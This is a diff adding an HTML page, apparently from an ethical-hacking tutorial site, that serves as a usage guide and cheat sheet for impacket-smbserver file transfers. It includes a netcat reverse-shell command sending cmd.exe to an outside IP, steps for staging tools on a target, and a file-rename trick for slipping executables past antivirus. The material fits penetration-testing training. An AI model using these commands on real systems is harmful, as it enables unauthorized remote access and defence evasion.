@@ -1,0 +1,156 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>impacket-smbserver — ad-hoc SMB file share</title>
+  <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+
+  <h1>What is <code>impacket-smbserver</code>?</h1>
+  <p class="common">
+    <code>impacket-smbserver</code> spins up a quick SMB server (SMB2 supported) from any directory.
+    It's perfect for ad-hoc file sharing in labs, Windows ↔ Linux transfers, and staging tools during
+    assessments. You can run it anonymously or require credentials. <strong>Use only on networks where you have permission.</strong>
+  </p>
+
+  <h1>Quick Start</h1>
+
+  <h2 class="blue">Serve current directory (anonymous)</h2>
+  <div class="code-box"><pre><code>kali@kali$ <u>impacket-smbserver share .</u>
+# Windows client:
+C:\&gt; <u>dir \\&lt;your-ip&gt;\share</u></code></pre></div>
+
+  <h2 class="blue">Install file from target machine</h2>
+  <div class="code-box"><pre><code>copy filename \\MY_IP\share</code></pre></div>
+
+  <h2 class="blue">You can use binary via smbserver</h2>
+  <div class="code-box"><pre><code>\\10.10.16.38\share\nc64.exe -e cmd.exe 10.10.16.38 4444</code></pre></div>
+
+  <h2 class="blue">Serve with SMB2 + credentials</h2>
+  <div class="code-box"><pre><code>kali@kali$ <u>impacket-smbserver share /path/to/files -smb2support -username u -password p</u>
+# Windows client (map then copy):
+C:\&gt; <u>net use \\&lt;your-ip&gt;\share /user:u p</u>
+C:\&gt; <u>copy \\&lt;your-ip&gt;\share\tool.exe C:\Windows\Temp\tool.exe</u></code></pre></div>
+
+  <h2 class="blue">Single file test (good for connectivity)</h2>
+  <div class="code-box"><pre><code>C:\&gt; <u>type \\&lt;your-ip&gt;\share\readme.txt &gt; NUL</u></code></pre></div>
+
+  <h1>Useful Flags</h1>
+  <table border="1" cellpadding="6" cellspacing="0">
+    <thead>
+      <tr>
+        <th>Flag</th>
+        <th>What it does</th>
+        <th>Example</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>-smb2support</code></td>
+        <td>Enable SMB2 (better compatibility with modern Windows)</td>
+        <td><code class="inline">-smb2support</code></td>
+      </tr>
+      <tr>
+        <td><code>-username</code>, <code>-password</code></td>
+        <td>Require auth (NTLM). Recommended outside isolated labs.</td>
+        <td><code class="inline">-username u -password p</code></td>
+      </tr>
+      <tr>
+        <td><code>-port</code></td>
+        <td>Change listening TCP port (default 445). Requires client to specify non-default port via port-forward or proxy.</td>
+        <td><code class="inline">-port 445</code></td>
+      </tr>
+      <tr>
+        <td><code>-config</code></td>
+        <td>INI-style config with multiple shares.</td>
+        <td><code class="inline">-config smb.conf</code></td>
+      </tr>
+      <tr>
+        <td><code>-debug</code></td>
+        <td>Verbose logging (handy for auth and read/write failures).</td>
+        <td><code class="inline">-debug</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h1>Examples in Context</h1>
+
+  <h2 class="blue">Anonymous, quick push</h2>
+  <div class="code-box"><pre><code># Serve the current folder as \\&lt;ip&gt;\share
+kali@kali$ <u>impacket-smbserver share . -smb2support</u>
+
+# On Windows (copy to temp)
+C:\&gt; <u>copy \\&lt;ip&gt;\share\tool.ps1 %TEMP%\tool.ps1</u></code></pre></div>
+
+  <h2 class="blue">Authenticated + map drive letter</h2>
+  <div class="code-box"><pre><code>kali@kali$ <u>impacket-smbserver tools /opt/tools -smb2support -username u -password p</u>
+C:\&gt; <u>net use Z: \\&lt;ip&gt;\tools /user:u p</u>
+C:\&gt; <u>copy Z:\nc64.exe C:\Windows\Temp\nc.exe</u></code></pre></div>
+
+  <h2 class="blue">Diagnose copy failures</h2>
+  <div class="code-box"><pre><code># 1) Verify listing from Windows
+C:\&gt; <u>dir \\&lt;ip&gt;\share</u>
+
+# 2) Try a tiny text first
+C:\&gt; <u>copy \\&lt;ip&gt;\share\readme.txt %TEMP%\r.txt</u>
+
+# 3) If EXE fails but text works, suspect AV/EDR
+#    Rename-on-wire trick:
+C:\&gt; <u>copy \\&lt;ip&gt;\share\nc64.txt %TEMP%\nc.txt &amp; ren %TEMP%\nc.txt nc.exe</u></code></pre></div>
+
+  <h1>Troubleshooting</h1>
+  <ul>
+    <li><strong>“The user name or password is incorrect.”</strong> — Your server requires creds. Use <code>net use \\IP\share /user:u p</code> before copying, or run server without creds in a lab.</li>
+    <li><strong>“An unexpected network error occurred.” / <code>0 file(s) copied.</code></strong>
+      <ul>
+        <li>Confirm the file is actually in the served directory: on Kali, run <code>ls</code>; from Windows, <code>dir \\IP\share</code>.</li>
+        <li>Try copying to a permissive path: <code>%TEMP%</code> or <code>C:\Windows\Temp</code>.</li>
+        <li>If text copies but EXE fails, AV/EDR may block executable streams. Rename-on-wire (<code>.txt</code> → <code>.exe</code>) or zip first.</li>
+        <li>Run server with <code>-debug</code> to see auth/IO errors.</li>
+      </ul>
+    </li>
+    <li><strong>Can list but cannot copy</strong> — Often destination ACL/Controlled Folder Access. Use <code>%TEMP%</code> first.</li>
+    <li><strong>Old Windows client</strong> — Try without <code>-smb2support</code> (SMB1), but only on isolated labs.</li>
+    <li><strong>Firewall</strong> — Ensure TCP 445 from target → your box is allowed (VPN/firewall/security group).</li>
+  </ul>
+
+  <h1>Config file example</h1>
+  <div class="code-box"><pre><code># smb.conf (INI-style) for multiple shares
+[global]
+server_name = LABSMB
+server_os   = Windows
+server_domain = WORKGROUP
+
+[tools]
+comment = Tools share
+path    = /opt/tools
+read only = no
+
+[drops]
+comment = Staging
+path    = /tmp/stage
+read only = no</code></pre></div>
+  <div class="code-box"><pre><code>kali@kali$ <u>impacket-smbserver -config smb.conf -smb2support -username u -password p</u></code></pre></div>
+
+  <h1>Cheat Sheet</h1>
+  <ul>
+    <li>Start server (SMB2, creds): <code class="inline">impacket-smbserver share . -smb2support -username u -password p</code></li>
+    <li>Map (Windows): <code class="inline">net use \\IP\share /user:u p</code> or <code class="inline">net use Z: \\IP\share /user:u p</code></li>
+    <li>List: <code class="inline">dir \\IP\share</code></li>
+    <li>Copy: <code class="inline">copy \\IP\share\file %TEMP%\file</code></li>
+    <li>Silent test read: <code class="inline">type \\IP\share\file &gt; NUL</code></li>
+    <li>Better errors: <code class="inline">robocopy \\IP\share C:\Path file.ext /R:0 /W:0</code></li>
+  </ul>
+
+  <h1>Safety & Notes</h1>
+  <ul>
+    <li>Don’t expose test SMB to untrusted networks; require credentials where possible.</li>
+    <li>SMB1 is deprecated &amp; risky; prefer <code>-smb2support</code>.</li>
+    <li>Windows is case-insensitive on paths; Linux share is case-sensitive for the served filenames.</li>
+  </ul>
+
+</body>
+</html>
